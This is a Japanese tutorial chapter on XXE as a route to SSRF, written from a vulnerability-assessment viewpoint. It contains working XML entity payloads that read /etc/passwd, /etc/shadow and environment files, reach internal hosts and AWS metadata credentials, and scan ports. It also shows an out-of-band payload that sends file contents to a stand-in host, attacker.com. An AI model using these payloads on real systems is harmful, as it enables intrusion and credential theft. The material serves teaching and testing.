# 第5章：SSRF との関係・影響範囲

## 5-1. SSRF とは何か

**SSRF（Server-Side Request Forgery：サーバーサイドリクエストフォージェリ）** とは、
攻撃者がサーバーに「意図しないリクエストを発行させる」攻撃手法。

```
【通常のリクエスト】
攻撃者 ──→ Webサーバー（公開されている部分のみアクセス可能）

【SSRF】
攻撃者 ──→ Webサーバー ──→ 内部ネットワーク・内部リソース
                ↑
          サーバーを踏み台にする
```

> **核心**：攻撃者が直接アクセスできない場所に、**サーバーを踏み台にしてアクセスさせる**。

---

## 5-2. XXE と SSRF の関係

XXE は SSRF を引き起こす手段の一つ。

```
XXE の外部エンティティ定義
        ↓
パーサーが SYSTEM URI へアクセス
        ↓
そのアクセスはサーバー自身から発生する
        ↓
= サーバーが意図しないリクエストを発行している
        ↓
= SSRF
```

```xml
<!-- XXE を使った SSRF の最小構成 -->
<!ENTITY ssrf SYSTEM "http://192.168.1.1/admin">
```

> XXE は「ファイル読み取り」だけでなく、**SSRF の踏み台としても機能する**。
> これが XXE の影響範囲を大きく広げている理由。

---

## 5-3. 攻撃者から見たネットワーク構造

XXE/SSRF を理解するために、まずネットワークの境界を把握する。

```
【インターネット（外部）】
攻撃者
    ↓ アクセス可能
┌──────────────────────────────────┐
│  DMZ（公開ゾーン）                 │
│  ┌───────────────┐               │
│  │  Webアプリ     │ ← 攻撃者が直接触れるのはここまで
│  │ （XMLパーサー）│               │
│  └───────────────┘               │
└──────────┬───────────────────────┘
           ↓ サーバーはここにもアクセスできる
┌──────────┴───────────────────────┐
│  内部ネットワーク（非公開）         │
│  ┌───────────┐  ┌─────────────┐  │
│  │ DB サーバー│  │  管理画面   │  │
│  └───────────┘  └─────────────┘  │
│  ┌───────────┐  ┌─────────────┐  │
│  │  クラウド  │  │  内部 API  │  │
│  │メタデータ  │  └─────────────┘  │
│  └───────────┘                   │
└──────────────────────────────────┘
```

> 攻撃者は通常、内部ネットワークに直接アクセスできない。
> しかし XXE で Web アプリ（サーバー）を踏み台にすると、**内部ネットワークに到達できる**。

## 5-4. XXE/SSRF で可能になる攻撃の種類

### 5-4-1. ローカルファイルの読み取り（file://）

```xml
<!ENTITY f SYSTEM "file:///etc/passwd">
<!ENTITY f SYSTEM "file:///etc/shadow">
<!ENTITY f SYSTEM "file:///proc/self/environ">
<!ENTITY f SYSTEM "file:///var/www/html/config.php">
```

| ターゲットファイル | 取得できる情報 |
|----------------|-------------|
| `/etc/passwd` | ユーザー一覧・UID |
| `/etc/shadow` | パスワードハッシュ |
| `/proc/self/environ` | 環境変数（API キー等） |
| `config.php` 等 | DB 接続情報・認証情報 |

---

### 5-4-2. 内部ネットワークへの HTTP リクエスト（http://）

```xml
<!ENTITY s SYSTEM "http://192.168.1.1/admin">
<!ENTITY s SYSTEM "http://10.0.0.1:8080/api/users">
<!ENTITY s SYSTEM "http://localhost:9200/">   ← Elasticsearch
```

攻撃者が直接アクセスできない内部サービスへのリクエストを、
サーバーに代わりに発行させる。

---

### 5-4-3. クラウドメタデータへのアクセス

クラウド環境（AWS・GCP・Azure）では、インスタンス内から特定のアドレスにアクセスすると
認証情報が取得できる。

```xml
<!-- AWS のメタデータエンドポイント -->
<!ENTITY m SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/">
```

```
取得できる情報：
- IAM ロールの認証情報（Access Key ID / Secret Access Key）
- セッショントークン
        ↓
AWS リソース全体への不正アクセスに発展する可能性がある
```

> **現代の XXE で最も深刻な影響の一つ**。
> クラウド環境では、メタデータ経由でインフラ全体の権限を奪取できる場合がある。

---

### 5-4-4. 内部ポートスキャン

SSRF を使ってサーバー自身の内部ポートを探索できる。

```xml
<!ENTITY p SYSTEM "http://127.0.0.1:22/">    ← SSH
<!ENTITY p SYSTEM "http://127.0.0.1:3306/">  ← MySQL
<!ENTITY p SYSTEM "http://127.0.0.1:6379/">  ← Redis
<!ENTITY p SYSTEM "http://127.0.0.1:9200/">  ← Elasticsearch
```

```
レスポンスの違いで判断：
ポートが開いている  → 何らかのレスポンスが返る
ポートが閉じている  → 接続拒否エラー or タイムアウト
```

> **診断視点**：レスポンスの差異・応答時間の差異がポートの開閉を示す指標になる。

---

## 5-5. Out-of-Band XXE（OOB-XXE）

アプリのレスポンスに展開結果が含まれない場合でも、
**外部サーバーへのアクセスで情報を持ち出す**手法。

```
【通常の XXE（インバンド）】
攻撃者 → 悪意ある XML 送信
       → サーバーがファイルを読む
       → レスポンスに内容が含まれる
       → 攻撃者がレスポンスから読み取る

【OOB-XXE（アウトオブバンド）】
攻撃者 → 悪意ある XML 送信
       → サーバーがファイルを読む
       → 攻撃者の外部サーバーへ HTTP リクエストで送信
       → 攻撃者がアクセスログで受け取る
```

### OOB-XXE の構成（パラメータエンティティを活用）

```xml
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % exfil
  "<!ENTITY send SYSTEM 'http://attacker.com/?data=%file;'>">
%exfil;
&send;
```

```
動作の流れ：
① %file にファイル内容を読み込む
② %exfil を展開して &send; エンティティを動的に定義する
③ &send; を参照 → attacker.com へファイル内容付きでリクエスト
④ 攻撃者がログで内容を受け取る
```

> **診断視点**：Burp Collaborator などの外部受信ツールを使って、
> レスポンスに出なくても DNS/HTTP リクエストが来るかどうかで脆弱性を確認する。

## 5-6. 影響範囲の全体像

```
XXE で発生する SSRF の影響範囲

file:// スキーム
    └─ サーバー内ファイルの読み取り
         ├─ 認証情報・設定ファイル
         ├─ ソースコード
         └─ OS の重要ファイル

http:// / https:// スキーム
    ├─ 内部ネットワークへのアクセス
    │    ├─ 管理画面・内部 API
    │    └─ DB・キャッシュサーバー等
    ├─ クラウドメタデータ取得
    │    └─ IAM 認証情報 → インフラ全体の奪取
    ├─ 内部ポートスキャン
    └─ OOB による情報外部送信
         └─ レスポンスに出なくても情報持ち出しが可能
```

---

## 5-7. 攻撃が成立する条件の整理

診断時に「脆弱かどうか」を判断するための条件。

| 条件 | 内容 |
|------|------|
| ① XML を受け付けている | リクエストボディや引数で XML を処理している |
| ② パーサーが外部エンティティを処理する | デフォルト有効のパーサーが使われている |
| ③ 結果がレスポンスに含まれる | インバンド XXE が成立する |
| ③' 外部へのリクエストが可能 | ③ でなくても OOB-XXE が成立する |

> **③ か ③' のどちらかが満たされれば攻撃は成立する。**
> 「レスポンスに出ないから安全」ではない。

---

## 5-8. インバンド XXE vs OOB-XXE の比較

| 観点 | インバンド XXE | OOB-XXE |
|------|-------------|---------|
| 結果の取得方法 | レスポンスに直接含まれる | 外部サーバーのログで受け取る |
| 検出難易度 | 低い（レスポンスを見るだけ） | 高い（外部受信ツールが必要） |
| 成立条件 | エラーや結果がレスポンスに出る | 外部への HTTP/DNS リクエストが可能 |
| 使用するエンティティ | 外部・一般エンティティ | 外部・パラメータエンティティ |
| 診断ツール例 | ブラウザ・Burp Suite | Burp Collaborator・interactsh |

```
診断の視点
├─ インバンド：レスポンスに展開結果が含まれるか
└─ アウトオブバンド：外部受信ツールへのリクエストが来るか
```
